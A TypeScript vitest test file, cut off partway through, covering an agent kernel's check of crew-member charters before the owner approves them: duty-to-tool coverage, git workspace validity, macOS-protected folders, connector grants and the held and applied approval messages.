// The charter readiness check (phase 8 item 18b, `kernel/src/agents/charter-readiness.ts`):
// before a held `kernel_agent_create` or `kernel_agent_update` reaches the
// owner, the kernel checks every duty against the jobs the charter grants and
// every granted job's prerequisites (a copy of a repo, a connector grant),
// shows the result as a readiness block right after the display's first line,
// tells Wright the open findings and the fix (`agentNote`, appended by the gate
// to the held reason) and names what was still open in the applied sentence.
//
// Unit cases call `charterReadiness` with the shipped composition's catalogue
// (and the `homeDir` seam for the protected folders). Gate cases run the
// session manager (fake spawner/query) with the shipped tools' pre-hold check
// and decide through `decideApproval` with the shipped applier. Workspaces are
// fake checkouts under a temp dir (a `.git/config` with remotes). Never the
// real SDK, a model, git or the network.
import { createHash } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { dirname, join } from "node:path";
import type { HookCallback, HookInput } from "@anthropic-ai/claude-agent-sdk";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  READINESS_COVERED_PREFIX,
  READINESS_FLAG_PREFIX,
  READINESS_HEADING,
  READINESS_HEADING_PREFIX,
  READINESS_NOT_CHECKED_PREFIX,
  READINESS_READY_PREFIX,
  charterReadiness,
  openFlagsSentence,
  wrightDutyRefusal,
} from "../src/agents/charter-readiness.js";
import type { ReadinessGrant, ReadinessResult } from "../src/agents/charter-readiness.js";
import { AGENT_CREATE_TOOL_NAME, AGENT_UPDATE_TOOL_NAME } from "../src/agents/charter-tools.js";
import { agentSettingsPath, createAgent, getAgent, validateCharter } from "../src/agents/index.js";
import type { Charter } from "../src/agents/index.js";
import { decideApproval } from "../src/approvals/index.js";
import { readWorkspaceRepos, remoteRepos } from "../src/automate/checkout.js";
import { defaultWrightSettingsJson, wrightSettingsPath } from "../src/brain/index.js";
import { TOOL_JOBS, TOOL_JOB_DEFINITIONS, buildToolCatalogue } from "../src/features/catalogue.js";
import type { ToolJob } from "../src/features/catalogue.js";
import { PHASE1_RESERVED, SHIPPED_CONTRIBUTIONS, mergeContributions } from "../src/features/index.js";
import type { ContributedTool } from "../src/features/index.js";
import { protectedLocationsText } from "../src/protected-paths.js";
import { SessionManager } from "../src/sessions/manager.js";
import type { HeldToolCheck, ToolPolicy } from "../src/sessions/types.js";
import { Store } from "../src/store/index.js";
import { approvalApplierOf, heldToolCheckOf } from "../src/tools/server.js";
import type { KernelToolContext } from "../src/tools/server.js";
import { count, events } from "./loop-helpers.js";
import { fakeSessions, makePluginDir, stubProvider } from "./session-fakes.js";
import type { FakeCall } from "./session-fakes.js";

const K = "mcp__kernel__";
const CREATE = `${K}${AGENT_CREATE_TOOL_NAME}`;
const UPDATE = `${K}${AGENT_UPDATE_TOOL_NAME}`;
const MODEL = "claude-haiku-4-5";
const T0 = "2026-11-10T10:00:00.000Z";
const WRIGHT_POLICY: ToolPolicy = { allowedTools: [CREATE, UPDATE], allowedBashPrefixes: [] };
/** The shipped composition's tools: the pre-hold check, the applier and the catalogue are all built from them, as in the kernel. */
const SHIPPED_TOOLS: readonly ContributedTool[] = mergeContributions(SHIPPED_CONTRIBUTIONS, PHASE1_RESERVED).tools;
const CATALOGUE = buildToolCatalogue(SHIPPED_TOOLS);
/** The held reason with no note: byte-identical to before the readiness check. */
const HELD_REASON =
  "approval_required: held as approval 1; it did not run. The owner decides in Studio's Approvals (approval 1) " +
  "and the decision arrives as a new message. End your turn now; if it is approved, the kernel applies it itself and that message says what it did; do not repeat the call.";
const NOTE_START = "The kernel checked this charter before the owner sees it; open: ";
const PROCEED = " The owner chose to proceed with these still open: ";
const NO_ROOT = process.getuid?.() !== 0;

let tmp: string;
let dataDir: string;
let pluginDir: string;
let home: string;
const clock = { at: new Date(T0) };
const stores: Store[] = [];
const locked: string[] = [];

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "studio-charter-readiness-"));
  dataDir = join(tmp, "data");
  pluginDir = makePluginDir(tmp);
  home = join(tmp, "home");
  mkdirSync(home);
  clock.at = new Date(T0);
});

afterEach(() => {
  for (const s of stores.splice(0)) if (s.isOpen) s.close();
  // A test that failed while a path was unreadable must not leave it so.
  for (const p of locked.splice(0)) if (existsSync(p)) chmodSync(p, 0o700);
  rmSync(tmp, { recursive: true, force: true });
});

// ---- Fixtures ------------------------------------------------------------------

/** The full names of `job`'s catalogue tools, in catalogue order. */
function toolsOf(job: ToolJob): string[] {
  const tools = CATALOGUE.jobs.find((j) => j.id === job)?.tools.map((t) => `${K}${t.name}`) ?? [];
  if (tools.length === 0) throw new Error(`the shipped catalogue has no tool for ${job}`);
  return tools;
}

/** A duty entry. */
const duty = (text: string, ...jobs: ToolJob[]) => ({ text, jobs });

/** A developer charter granting every tool of `jobs` (plus Read), with `duties` and no workspace unless `extra` says. */
function crew(duties: unknown[], jobs: readonly ToolJob[], extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id: "dev",
    display_name: "Dev",
    avatar: { shape: "crab", hue: "crew-teal" },
    persona: "A developer for the owner's sandbox repo.",
    duties,
    boundaries: ["Never merge a pull request yourself."],
    model: "claude-sonnet-5",
    permission_mode: "default",
    tool_policy: { allowedTools: ["Read", ...jobs.flatMap(toolsOf)], allowedBashPrefixes: [], never: [] },
    workspaces: [],
    ...extra,
  };
}

/** Approval #19's charter (item 16 Validation 2), reconstructed from the requirement's Problem section. */
function approval19(): Record<string, unknown> {
  return crew(
    [duty("Turn tickets into PRs", "automate_tickets"), duty("Triage PR comments", "triage_pr_comments"), duty("Ask for merges", "ask_for_merge")],
    ["automate_tickets", "read_pr"],
    { connectors: ["github"] },
  );
}

function validated(c: unknown): Charter {
  const r = validateCharter(c, { dataDir });
  if (!r.ok) throw new Error(`not valid: ${r.message}`);
  return r.charter;
}

/** A fake git checkout at `path` whose config names `remotes` as URLs. */
function checkout(path: string, ...remotes: string[]): string {
  mkdirSync(join(path, ".git"), { recursive: true });
  writeFileSync(join(path, ".git", "config"), `[core]\n\tbare = false\n${remotes.map((u, i) => `[remote "r${i}"]\n\turl = ${u}\n`).join("")}`);
  return path;
}

/** `path` made unreadable (restored after the test). */
function lock(path: string): void {
  locked.push(path);
  chmodSync(path, 0o000);
}

function readiness(c: unknown, grant: ReadinessGrant = { kind: "proposed", connectors: [] }, action: "create" | "update" = "create", homeDir = home): ReadinessResult {
  return charterReadiness({ action, charter: validated(c), catalogue: CATALOGUE, grant, dataDir, homeDir });
}

/** The lines of a display that are its readiness block (every one starts with a readiness prefix). */
function readinessLines(display: string): string[] {
  const prefixes = [READINESS_HEADING_PREFIX, READINESS_COVERED_PREFIX, READINESS_READY_PREFIX, READINESS_FLAG_PREFIX, READINESS_NOT_CHECKED_PREFIX];
  return display.split("\n").filter((l) => prefixes.some((p) => l.startsWith(p)));
}

/** The fix sentence's jobs and tools (`add <labels> to tool_policy.allowedTools (<tools>)`), or undefined. */
function proposedFix(note: string | undefined): { labels: string; tools: string[] } | undefined {
  const m = /The fix to propose: add (.+?) to tool_policy\.allowedTools \(([^)]*)\)/.exec(note ?? "");
  return m === null ? undefined : { labels: m[1] as string, tools: (m[2] as string).split(", ") };
}

// ---- The gate harness --------------------------------------------------------------

function writeWrightSettings(): void {
  const file = wrightSettingsPath(dataDir);
  mkdirSync(dirname(file), { recursive: true });
  const settings = JSON.parse(defaultWrightSettingsJson()) as Record<string, unknown>;
  writeFileSync(file, `${JSON.stringify({ ...settings, model: MODEL }, null, 2)}\n`);
}

type Decision = { hookEventName: string; permissionDecision: string; permissionDecisionReason: string };

function gateOf(call: FakeCall): (tool: string, toolInput: unknown) => Promise<Decision> {
  const hook = call.options.hooks?.PreToolUse?.[0]?.hooks[0] as HookCallback;
  return async (tool, toolInput) => {
    const input = { hook_event_name: "PreToolUse", tool_name: tool, tool_input: toolInput, tool_use_id: "toolu_1", session_id: "s", transcript_path: "/dev/null", cwd: tmp } as unknown as HookInput;
    return ((await hook(input, "toolu_1", { signal: new AbortController().signal })) as { hookSpecificOutput: Decision }).hookSpecificOutput;
  };
}

/**
 * A session manager whose gate has the shipped tools' pre-hold check (or
 * `check`), with Wright's session started; `decide` is the owner's `once`
 * with the shipped applier (its catalogue is the composition's).
 */
async function boot(check?: HeldToolCheck) {
  writeWrightSettings();
  const store = new Store({ dataDir });
  stores.push(store);
  const now = (): Date => clock.at;
  const fakes = fakeSessions();
  const toolSessions: KernelToolContext["sessions"] = { stopSession: (id: number) => manager.stopSession(id), getSession: (id: number) => manager.getSession(id) };
  const contextOf = (sessionId: number): KernelToolContext => ({ store, sessions: toolSessions, sessionId, now });
  const manager: SessionManager = new SessionManager(
    { store, authProvider: stubProvider(), loomwrightPath: pluginDir, stopGraceMs: 10, baseEnv: { PATH: "/usr/bin" }, heldToolCheck: check ?? heldToolCheckOf(SHIPPED_TOOLS, contextOf) },
    { ...fakes.deps, homeDir: home, now },
  );
  const handle = await manager.startSession({ agent: "wright", prompt: "Draft a crew member.", model: MODEL, permissionMode: "default", cwd: tmp, policy: WRIGHT_POLICY, closeInputOnResult: false });
  const gate = gateOf(fakes.calls[fakes.calls.length - 1] as FakeCall);
  const applier = approvalApplierOf(SHIPPED_TOOLS);
  const decide = (id: number) => decideApproval(store, { id, decision: "once", by: "owner" }, clock.at, applier);
  const display = (n = 1) => String(events(store, "approval_requested")[n - 1]?.payload.display);
  const applied = (n = 1) => events(store, "approval_decided")[n - 1]?.payload.applied;
  const approvals = () => count(store, "SELECT count(*) FROM approvals");
  /** The owner's own create (`studio agents create`'s path: no readiness check, bare-string duties allowed). */
  const ownerCreate = (c: unknown) => {
    const r = createAgent(store, dataDir, c, { by: "owner" }, clock.at);
    if (!r.ok) throw new Error(`owner create refused: ${r.message}`);
  };
  const settingsFile = (id: string) => agentSettingsPath(dataDir, id);
  const shaOf = (id: string) => createHash("sha256").update(readFileSync(settingsFile(id))).digest("hex");
  /** Hand-edit the member's settings file `connectors` (the owner's own step, in Team). */
  const setConnectors = (id: string, value: unknown) => {
    const file = settingsFile(id);
    const json = JSON.parse(readFileSync(file, "utf8")) as Record<string, unknown>;
    writeFileSync(file, `${JSON.stringify({ ...json, connectors: value }, null, 2)}\n`);
  };
  const update = (id: string, changes: Record<string, unknown>, key = "u1") => gate(UPDATE, { id, changes, expected_sha256: shaOf(id), idempotency_key: key });
  const create = (c: unknown, key = "c1") => gate(CREATE, { charter: c, idempotency_key: key });
  return { store, gate, create, update, decide, display, applied, approvals, ownerCreate, setConnectors };
}

// ---- The format ----------------------------------------------------------------------

describe("the readiness format", () => {
  it("every line prefix is an exported constant, and every line of a block starts with exactly one", () => {
    expect([READINESS_HEADING_PREFIX, READINESS_COVERED_PREFIX, READINESS_READY_PREFIX, READINESS_FLAG_PREFIX, READINESS_NOT_CHECKED_PREFIX]).toEqual([
      "readiness: ",
      "  covered: ",
      "  ready: ",
      "  flagged: ",
      "  not checked: ",
    ]);
    expect(READINESS_HEADING.startsWith(READINESS_HEADING_PREFIX)).toBe(true);
    const r = readiness(approval19());
    expect(r.lines[0]).toBe(READINESS_HEADING);
    for (const line of r.lines.slice(1)) {
      expect([READINESS_COVERED_PREFIX, READINESS_READY_PREFIX, READINESS_FLAG_PREFIX, READINESS_NOT_CHECKED_PREFIX].filter((p) => line.startsWith(p))).toHaveLength(1);
    }
  });

  it("the code jobs are declared once, on the job: TOOL_JOBS is derived from the definitions with the same ids, order and labels", () => {
    expect(Object.keys(TOOL_JOBS)).toEqual(Object.keys(TOOL_JOB_DEFINITIONS));
    for (const [id, def] of Object.entries(TOOL_JOB_DEFINITIONS)) expect(TOOL_JOBS[id as ToolJob]).toBe(def.label);
    expect(Object.entries(TOOL_JOB_DEFINITIONS).filter(([, d]) => d.needsWorkspace).map(([id]) => id)).toEqual(["automate_tickets", "triage_pr_comments", "ask_for_merge"]);
  });
});

// ---- AC1, AC4: covered and ready --------------------------------------------------------

describe("AC1 and AC4: everything covered and ready, nothing flagged, no note", () => {
  it("AC1: a member whose duties' jobs are granted, with a GitHub checkout and the owner's GitHub write grant, reads covered and ready; the held update carries no note", async () => {
    const ws = checkout(join(tmp, "work", "sandbox"), "git@github.com:owner/studio-sandbox.git");
    const h = await boot();
    h.ownerCreate(
      crew([duty("Turn tickets into PRs", "automate_tickets"), duty("Triage PR comments", "triage_pr_comments"), duty("Ask for merges", "ask_for_merge")], ["automate_tickets", "triage_pr_comments", "ask_for_merge"], {
        workspaces: [ws],
      }),
    );
    h.setConnectors("dev", { github: "write" });
    expect((await h.update("dev", { limits: { tokens_per_day: 100000 } })).permissionDecisionReason).toBe(HELD_REASON);
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      "  covered: duty 1 by Hand tickets to /automate: Turn tickets into PRs",
      "  covered: duty 2 by Triage PR comments: Triage PR comments",
      "  covered: duty 3 by Ask for a merge: Ask for merges",
      `  ready: copy of a repo for Hand tickets to /automate, Triage PR comments and Ask for a merge: works in owner/studio-sandbox at ${ws}`,
      // One line per connector level: each job's needs fold a read need into its write need.
      "  ready: GitHub write access for Hand tickets to /automate, Triage PR comments and Ask for a merge: granted",
    ]);
    // The readiness block is right after the head line.
    expect(h.display().split("\n")[1]).toBe(READINESS_HEADING);
    // Approved with nothing open: the applied sentence is as before.
    h.decide(1);
    expect(h.applied()).toBe("The kernel updated crew member dev on approval 1: limits.tokens_per_day.");
  });

  it("AC1 (unit): nothing open gives no agentNote and no open-flags clause", () => {
    const ws = checkout(join(tmp, "work", "sandbox"), "https://github.com/owner/studio-sandbox.git");
    const r = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [ws] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(r.open).toEqual([]);
    expect(r.agentNote).toBeUndefined();
    expect(openFlagsSentence(r)).toBe("");
    expect(r.lines).toContain(`  ready: copy of a repo for Hand tickets to /automate: works in owner/studio-sandbox at ${ws}`);
  });

  it("AC1: a held create with nothing open has the byte-identical held reason (no note) and an applied sentence with no clause", async () => {
    const h = await boot();
    const c = crew([duty("Read the PRs the owner sends", "read_pr"), duty("Keep reports short")], ["read_pr"], { connectors: ["github"] });
    expect((await h.create(c)).permissionDecisionReason).toBe(HELD_REASON);
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      "  covered: duty 1 by Read a PR: Read the PRs the owner sends",
      "  covered: duty 2 with no tool (it needs no kernel tool): Keep reports short",
      "  ready: GitHub access for Read a PR: proposed in this charter",
    ]);
    h.decide(1);
    expect(h.applied()).toBe("The kernel created crew member dev (Dev) on approval 1.");
  });

  it("AC4: a duty entry with jobs: [] is covered with no tool, whatever the charter grants", () => {
    const r = readiness(crew([duty("Summarise each review in three lines or fewer.")], []));
    expect(r.lines).toEqual([READINESS_HEADING, "  covered: duty 1 with no tool (it needs no kernel tool): Summarise each review in three lines or fewer."]);
    expect(r.items[0]?.status).toBe("covered");
    expect(r.agentNote).toBeUndefined();
  });
});

// ---- AC2: approval #19 ----------------------------------------------------------------------

describe("AC2: approval #19's charter", () => {
  it("flags Triage PR comments and Ask for a merge as not covered, by their plain labels, and the note proposes adding exactly those two jobs' tools", async () => {
    const h = await boot();
    const held = await h.create(approval19());
    expect(held.permissionDecision).toBe("deny");
    expect(held.permissionDecisionReason.startsWith(`${HELD_REASON} ${NOTE_START}`)).toBe(true);
    expect(readinessLines(h.display())).toEqual([
      READINESS_HEADING,
      "  covered: duty 1 by Hand tickets to /automate: Turn tickets into PRs",
      "  flagged: duty 2 not covered (needs Triage PR comments, which this charter does not grant): Triage PR comments",
      "  flagged: duty 3 not covered (needs Ask for a merge, which this charter does not grant): Ask for merges",
      "  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in (no workspace is listed)",
      "  ready: GitHub access for Read a PR: proposed in this charter",
      "  flagged: GitHub write access for Hand tickets to /automate: only you can grant it (Team, in the member's inspector)",
    ]);
    // The note proposes exactly the two missing jobs, by their catalogue tool names, and no other tool.
    const note = held.permissionDecisionReason.slice(HELD_REASON.length + 1);
    const fix = proposedFix(note);
    expect(fix).toEqual({ labels: "Triage PR comments and Ask for a merge", tools: [...toolsOf("triage_pr_comments"), ...toolsOf("ask_for_merge")] });
    expect(note.match(/mcp__kernel__\w+/g)).toEqual([...toolsOf("triage_pr_comments"), ...toolsOf("ask_for_merge")]);
    // The note rides on the session's reason only: the approval stores no note.
    expect(JSON.stringify(events(h.store, "approval_requested")[0]?.payload)).not.toContain(NOTE_START);
  });
});

// ---- AC3: a code job without a copy of a repo ------------------------------------------------

describe("AC3: a code job with no copy of a repo to work in", () => {
  for (const job of ["automate_tickets", "triage_pr_comments", "ask_for_merge"] as const) {
    it(`${job}: no workspace is flagged "has no copy of a repo to work in", and the note asks the owner where their copy is`, () => {
      const r = readiness(crew([duty("Do the code job", job)], [job]));
      expect(r.lines).toContain(`  flagged: copy of a repo for ${TOOL_JOBS[job]}: it has no copy of a repo to work in (no workspace is listed)`);
      expect(r.agentNote).toContain("Ask the owner where their copy of the repo is");
    });
  }

  it("a workspace that is not a checkout, or has no GitHub remote, is no copy of a repo either; each says why", () => {
    const plainDir = join(tmp, "work", "notes");
    mkdirSync(plainDir, { recursive: true });
    const gitlab = checkout(join(tmp, "work", "gl"), "git@gitlab.com:owner/repo.git");
    const missing = join(tmp, "work", "gone");
    const r = readiness(crew([duty("Ask for merges", "ask_for_merge")], ["ask_for_merge"], { workspaces: [plainDir, gitlab, missing] }));
    expect(r.lines).toContain(
      `  flagged: copy of a repo for Ask for a merge: it has no copy of a repo to work in: ${plainDir}: it is not a git checkout; ${gitlab} has no GitHub remote; ${missing}: the folder does not exist`,
    );
    expect(r.agentNote).toContain("Ask the owner where their copy of the repo is");
  });

  it("a job that does not work on code has no workspace line", () => {
    const r = readiness(crew([duty("Read PRs", "read_pr")], ["read_pr"], { connectors: ["github"] }));
    expect(r.items.filter((i) => i.subject === "workspace")).toEqual([]);
  });

  it("several checkouts: the ready line names every repo found and where", () => {
    const a = checkout(join(tmp, "work", "a"), "https://github.com/owner/a.git", "git@github.com:upstream/a.git");
    const b = checkout(join(tmp, "work", "b"), "ssh://git@github.com/owner/b");
    const r = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [a, b] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(r.lines).toContain(`  ready: copy of a repo for Hand tickets to /automate: works in owner/a, upstream/a at ${a}; owner/b at ${b}`);
  });
});

// ---- AC5: a protected workspace -----------------------------------------------------------

describe("AC5: a workspace in a macOS-protected folder", () => {
  it("a create or update naming one is refused before the hold, in plain words saying why the folder can't be used", async () => {
    const h = await boot();
    // The hold checks the real home's protected folders (as the settings reader does); nothing is read or written there.
    const ws = join(homedir(), "Documents", "studio-sandbox");
    const why = `${ws} is inside a macOS-protected folder (${protectedLocationsText()}), so it can't be used: macOS blocks the kernel, which runs in the background, from reading anything there (D31); use a copy of the repo outside those folders`;
    const created = await h.create(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [ws] }));
    expect(created.permissionDecisionReason).toBe(`kernel_agent_create: invalid_input: workspaces.0: ${why} (nothing was held for the owner)`);
    h.ownerCreate(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"]));
    const updated = await h.update("dev", { workspaces: [ws] });
    expect(updated.permissionDecisionReason).toBe(`kernel_agent_update: invalid_input: the result would not be a valid charter: workspaces.0: ${why} (nothing was held for the owner)`);
    expect(h.approvals()).toBe(0);
  });

  it("the readiness check (homeDir seam) marks a protected checkout can't be used and why, never ready", () => {
    const ws = checkout(join(home, "Documents", "studio-sandbox"), "git@github.com:owner/studio-sandbox.git");
    const r = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [ws] }), { kind: "stored", raw: { github: "write" } }, "update");
    const line = r.items.find((i) => i.subject === "workspace")?.line;
    expect(line).toBe(
      `  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in: ${ws} can't be used: it is inside a macOS-protected folder (${protectedLocationsText()}), and macOS blocks the kernel, which runs in the background, from reading anything there (D31)`,
    );
    // The same checkout outside the protected folders is ready.
    const outside = checkout(join(home, "code", "studio-sandbox"), "git@github.com:owner/studio-sandbox.git");
    const ok = readiness(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"], { workspaces: [outside] }), { kind: "stored", raw: { github: "write" } }, "update");
    expect(ok.items.find((i) => i.subject === "workspace")?.status).toBe("ready");
  });

  it("a workspace that is the data dir or holds it can't be used (validateCharter refuses it first; the check never calls it ready)", () => {
    checkout(dataDir, "git@github.com:owner/data.git");
    const charter: Charter = { ...validated(crew([duty("Hand tickets over", "automate_tickets")], ["automate_tickets"])), workspaces: [tmp, dataDir] };
    const r = charterReadiness({ action: "update", charter, catalogue: CATALOGUE, grant: { kind: "stored", raw: { github: "write" } }, dataDir, homeDir: home });
    expect(r.items.find((i) => i.subject === "workspace")?.line).toBe(
      `  flagged: copy of a repo for Hand tickets to /automate: it has no copy of a repo to work in: ${tmp} can't be used: it is the kernel's data dir, inside it or holds it; ${dataDir} can't be used: it is the kernel's data dir, inside it or holds it`,
    );
  });
});

// ---- AC6: a connector the member lacks ---------------------------------------------------

describe("AC6: a connector the member lacks is the owner's step, never in the note's fix", () => {
  it("create: a job needing GitHub with no connector proposed names GitHub access as the owner's step; the note never proposes adding it", () => {
    const r = readiness(crew([duty("Read PRs", "read_pr")], ["read_pr"]), { kind: "proposed", connectors: [] });
    expect(r.lines).toContain("  flagged: GitHub access for Read a PR: only you can grant it (Team, in the member's inspector)");
    expect(r.agentNote).toContain("Connector access is the owner's own step, in Team");
    expect(proposedFix(r.agentNote)).toBeUndefined();
    expect(r.agentNote).not.toMatch(/connectors|\bgithub\b/);
  });

  it("create: a write level is never met by a proposal (only the owner sets it, in Team)", () => {
    const r = readiness(crew([duty("Read PRs", "read_pr"), duty("Triage comments", "triage_pr_comments")], ["read_pr", "triage_pr_comments"]), { kind: "proposed", connectors: ["github"] });
    expect(r.lines).toContain("  ready: GitHub access for Read a PR: proposed in this charter");
    expect(r.lines).toContain("  flagged: GitHub write access for Triage PR comments: only you can grant it (Team, in the member's inspector)");
    expect(proposedFix(r.agentNote)).toBeUndefined();
  });

  it("update: the member's stored grant is read at the needed level", async () => {
    const h = await boot();
    const ws = checkout(join(tmp, "work", "sandbox"), "git@github.com:owner/studio-sandbox.git");
    h.ownerCreate(crew([duty("Read PRs", "read_pr"), duty("Triage comments", "triage_pr_comments")], ["read_pr", "triage_pr_comments"], { workspaces: [ws], connectors: ["github"] }));
    const held = await h.update("dev", { limits: { tokens_per_day: 100000 } });
    expect(readinessLines(h.display())).toContain("  ready: GitHub access for Read a PR: granted");
    expect(readinessLines(h.display())).toContain("  flagged: GitHub write access for Triage PR comments: only you can grant it (Team, in the member's inspector)");
    const note = held.permissionDecisionReason.slice(HELD_REASON.length + 1);
    expect(note).toContain("Connector access is the owner's own step");
    expect(proposedFix(note)).toBeUndefined();
    // With no grant at all, every level is the owner's step.
    const none = readiness(crew([duty("Read PRs", "read_pr"), duty("Triage comments", "triage_pr_comments")], ["read_pr", "triage_pr_comments"], { workspaces: [ws] }), { kind: "stored", raw: undefined }, "update");
    expect(none.lines).toContain("  flagged: GitHub access for Read a PR: only you can grant it (Team, in the member's inspector)");
    expect(none.lines).toContain("  flagged: GitHub write access for Triage PR comments: only you can grant it (Team, in the member's inspector)");
  });
});

// ---- AC7: an update that removes a duty's job ---------------------------------------------

describe("AC7: an update whose tool_policy removes every tool of a job a stored duty names", () => {
  it("flags that duty against the merged tools, not the member's old ones", async () => {
    const h = await boot();
    h.ownerCreate(crew([duty("Read the PRs the owner sends", "read_pr")], ["read_pr"], { connectors: ["github"] }));
    const held = await h.update("dev", { tool_policy: { allowedTools: ["Read"], allowedBashPrefixes: [] } });
    expect(readinessLines(h.display())).toEqual([READINESS_HEADING, "  flagged: duty 1 not covered (needs Read a PR, which this charter does not grant): Read the PRs the owner sends"]);
    const note = held.permissionDecisionReason.slice(HELD_REASON.length + 1);
    expect(proposedFix(note)?.tools).toEqual(toolsOf("read_pr"));
    expect(note).toContain("propose a kernel_agent_update with a new idempotency_key");
  });

  it("removing only some of a job's tools also leaves the duty uncovered", () => {
    const tools = toolsOf("read_pr");
    const c = crew([duty("Read PRs", "read_pr")], [], { tool_policy: { allowedTools: tools.slice(1), allowedBashPrefixes: [], never: [] }, connectors: ["github"] });
    const r = readiness(c);
    expect(r.items[0]?.status).toBe("flagged");
    expect(proposedFix(r.agentNote)?.tools).toEqual(tools.slice(0, 1));
  });
});

// ---- AC8: the applied sentence --------------------------------------------------------------

describe("AC8: an approval with flags still open names them in the applied sentence", () => {
  it("create: the owner's once on approval #19's charter records the open flags as the owner's choice to proceed", async () => {
    const h = await boot();
    await h.create(approval19());
    h.decide(1);
    expect(getAgent(h.store, "dev")).toBeDefined();
    expect(h.applied()).toBe(
      "The kernel created crew member dev (Dev) on approval 1." +
        `${PROCEED}duty 2 is not covered (needs Triage PR comments); duty 3 is not covered (needs Ask for a merge); ` +
        "no copy of a repo to work in (for Hand tickets to /automate); GitHub write access for Hand tickets to /automate: the owner's step in Team.",
    );
  });

  it("update: the applied sentence names the open flags of the merged result", async () => {
    const h = await boot();
    h.ownerCreate(crew([duty("Read the PRs the owner sends", "read_pr")], ["read_pr"], { connectors: ["github"] }));
    await h.update("dev", { tool_policy: { allowedTools: ["Read"], allowedBashPrefixes: [] } });
    h.decide(1);
    expect(h.applied()).toBe(`The kernel updated crew member dev on approval 1: tool_policy.${PROCEED}duty 1 is not covered (needs Read a PR).`);
  });
});

// ---- AC9: an unknown job ----------------------------------------------------------------------

describe("AC9: a duty naming a job outside TOOL_JOBS", () => {
  it("is refused invalid_input naming the job, and nothing is held (Wright's create)", async () => {
    const h = await boot();
    const d = await h.create(crew([duty("Deploy to production", "deploy_prod" as ToolJob)], []));
    expect(d.permissionDecision).toBe("deny");
    expect(d.permissionDecisionReason).toBe(
      `kernel_agent_create: invalid_input: duties.0.jobs.0: "deploy_prod" is not a job in the kernel's catalogue (the jobs are ${Object.keys(TOOL_JOBS).join(", ")}) (nothing was held for the owner)`,
    );
    expect(h.approvals()).toBe(0);
  });

  it("is refused on every path: the owner's create (validateCharter) too", () => {
    const r = validateCharter(crew([duty("Fine"), duty("Deploy", "read_pr", "deploy_prod" as ToolJob)], []), { dataDir });
    expect(r).toMatchObject({ ok: false, error: "charter_invalid", field: "duties.1.jobs.1" });
    expect(r.ok ? "" : r.message).toContain('"deploy_prod" is not a job in the kernel\'s catalogue');
  });

  it("an update of a member whose stored duty names an unknown job is refused, naming it", async () => {
    const h = await boot();
    h.ownerCreate(crew([duty("Read PRs", "read_pr")], ["read_pr"]));
    const stored = JSON.parse(String(getAgent(h.store, "dev")?.charter_json)) as Record<string, unknown>;
    h.store.prepare("UPDATE agents SET charter_json = ? WHERE id = 'dev'").run(JSON.stringify({ ...stored, duties: [duty("Deploy", "deploy_prod" as ToolJob)] }));
    const d = await h.update("dev", { limits: { tokens_per_day: 100000 } });
    expect(d.permissionDecisionReason).toMatch(/^kernel_agent_update: invalid_input: the result would not be a valid charter: duties\.0\.jobs\.0: "deploy_prod" is not a job in the kernel's catalogue/);
    expect(h.approvals()).toBe(0);
  });

  it("a duty entry with a misspelt key or a repeated job is refused too; a bare string stays valid", () => {
    expect(validateCharter(crew([{ text: "x", jobs: [], job: "read_pr" }], []), { dataDir })).toMatchObject({ ok: false, field: "duties.0.job" });
    expect(validateCharter(crew([duty("x", "read_pr", "read_pr")], []), { dataDir })).toMatchObject({ ok: false, field: "duties.0.jobs" });
    expect(validateCharter(crew(["A bare line, as the owner writes it."], []), { dataDir }).ok).toBe(true);
  });

  it("Wright's create refuses a bare-string duty (invalid_input, telling Wright to name its jobs); the owner's create keeps it", async () => {
    const h = await boot();
    const c = crew(["Turn tickets into PRs"], ["automate_tickets"]);
    const d = await h.create(c);
    expect(d.permissionDecisionReason).toBe(`kernel_agent_create: invalid_input: ${wrightDutyRefusal(validated(c))} (nothing was held for the owner)`);
    expect(d.permissionDecisionReason).toContain('duties.0: write each duty as {"text": "<the duty>", "jobs": [<the catalogue job ids that do it>]}');
    expect(h.approvals()).toBe(0);
    h.ownerCreate(c);
    expect(getAgent(h.store, "dev")).toBeDefined();
  });
});

// ---- AC10: a check that cannot run ----------------------------------------------------------

describe("AC10: a check that cannot run says which and why, never ready", () => {
  it.skipIf(!NO_ROOT)("a workspace whose git config can't be read: the repo line is not checked, and the read reports unreadable, never not a checkout", async () => {
    const ws = checkout(join(tmp, "work", "sandbox"), "git@github.com:owner/studio-sandbox.git");
    const h = await boot();
    h.ownerCreate(crew([duty("Ask for merges", "ask_for_merge")], ["ask_for_merge"], { workspaces: [ws] }));
    h.setConnectors("dev", { github: "write" });
    lock(join(ws, ".git", "config"));
    expect(readWorkspaceRepos(ws)).toEqual({ kind: "unreadable", detail: "its git config can't be read (EACCES)" });
    // The run-time reader keeps its answer: no repo, never a throw.
    expect(remoteRepos(ws)).toEqual([]);
    const held = await h.update("dev", { limits: { tokens_per_day: 100000 } });
    expect(readinessLines(h.display())).toContain(
      `  not checked: copy of a repo for Ask for a merge: can't tell whether it has one (${ws}: its git config can't be read (EACCES))`,
    );
    expect(held.permissionDecisionReason).toContain("Ask the owner to check that the kernel can read the workspace named above.");
  });

  it.skipIf(!NO_ROOT)("a workspace folder that can't be searched is unreadable too", () => {
    const ws = checkout(join(tmp, "work", "sandbox"), "git@github.com:owner/studio-sandbox.git");
    lock(ws);
    expect(readWorkspaceRepos(ws)).toEqual({ kind: "unreadable", detail: "its .git can't be read (EACCES)" });
